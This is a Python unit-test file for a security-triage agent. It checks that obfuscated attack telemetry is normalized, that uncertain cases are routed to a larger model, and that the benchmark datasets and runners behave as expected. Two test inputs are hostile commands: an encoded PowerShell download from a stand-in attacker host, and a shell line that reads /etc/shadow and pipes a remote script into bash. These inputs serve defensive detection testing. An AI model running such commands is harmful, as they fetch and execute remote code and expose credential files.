import asyncio
import base64
import tempfile
import unittest
from pathlib import Path

from sec_agent.engine import RoutingPolicy, UncertaintyPolicy
from sec_agent.eval.dataset_phase9 import build_phase9_dataset, build_soc_workload_dataset
from sec_agent.eval.live_runner import main as live_main
from sec_agent.eval.runner_phase9 import run_phase9_benchmark
from sec_agent.schemas import SeverityLevel, SubQTriageResult, ThreatCategory
from sec_agent.security import isolate_untrusted_log, normalize_telemetry


class TestPhase9AdversarialAndCalibration(unittest.TestCase):
    def test_base64_and_caret_obfuscation_normalized(self) -> None:
        encoded = base64.b64encode(b"Invoke-WebRequest http://evil.example/a.ps1").decode("ascii")
        raw = f"p^o^w^e^r^s^h^e^l^l.exe -enc {encoded}"
        norm = normalize_telemetry(raw)
        self.assertIn("caret_or_backtick_obfuscation", norm.obfuscation_signals)
        self.assertIn("base64_payload_decoded", norm.obfuscation_signals)
        self.assertIn("Invoke-WebRequest", norm.normalized_text)

    def test_unicode_zero_width_and_ifs_substitution_normalized(self) -> None:
        raw = "sh -c 'ca\u200bt${IFS}/etc/sha\u200bdow && curl http://x.test/k.sh | bash'"
        payload = isolate_untrusted_log(raw)
        self.assertIn("zero_width_chars_stripped", payload.obfuscation_signals)
        self.assertIn("shell_or_env_substitution", payload.obfuscation_signals)
        self.assertIn("command_chaining_detected", payload.obfuscation_signals)
        self.assertIn("/etc/shadow", payload.normalized_text)

    def test_uncertainty_policy_narrow_margin_and_obfuscation_invoke_gemini(self) -> None:
        policy = RoutingPolicy(
            uncertainty_policy=UncertaintyPolicy(
                confidence_threshold=0.85,
                calibration_margin=0.20,
                require_gemini_on_obfuscation=True,
            )
        )
        subq = SubQTriageResult(
            model="subq-snap-1.2",
            category=ThreatCategory.BENIGN,
            category_probabilities={"benign": 0.54, "suspicious_execution": 0.46},
            severity=SeverityLevel.LOW,
            severity_score=1.0,
            escalate_probability=0.10,
            prompt_injection_probability=0.0,
            confidence=0.92,
        )
        route = policy.decide(subq, "clean text", [], obfuscation_signals=["base64_payload_decoded"])
        self.assertTrue(route.invoke_gemini)
        self.assertTrue(any(r.startswith("narrow_probability_margin:") for r in route.reasons))
        self.assertTrue(any(r.startswith("obfuscation_detected:") for r in route.reasons))

    def test_phase9_dataset_size_and_soc_skew(self) -> None:
        ds = build_phase9_dataset()
        self.assertGreaterEqual(len(ds), 200)
        dev = [c for c in ds if c.split.value == "dev"]
        held = [c for c in ds if c.split.value == "held_out"]
        self.assertEqual(len(dev), 100)
        self.assertEqual(len(held), 120)

        soc = build_soc_workload_dataset()
        self.assertEqual(len(soc), 200)
        benign_ratio = sum(1 for c in soc if not c.expected_malicious) / len(soc)
        self.assertGreaterEqual(benign_ratio, 0.79)

    def test_phase9_benchmark_runner_outputs_jsonl_and_csv(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            sums = asyncio.run(run_phase9_benchmark(output_dir=tmp, use_mock=True))
            self.assertEqual(len(sums), 12)  # 3 splits x 4 modes
            self.assertTrue((Path(tmp) / "phase9_results.jsonl").exists())
            self.assertTrue((Path(tmp) / "phase9_summary.csv").exists())

    def test_live_runner_refuses_without_confirm_flag(self) -> None:
        code = live_main([])
        self.assertEqual(code, 2)


if __name__ == "__main__":
    unittest.main()
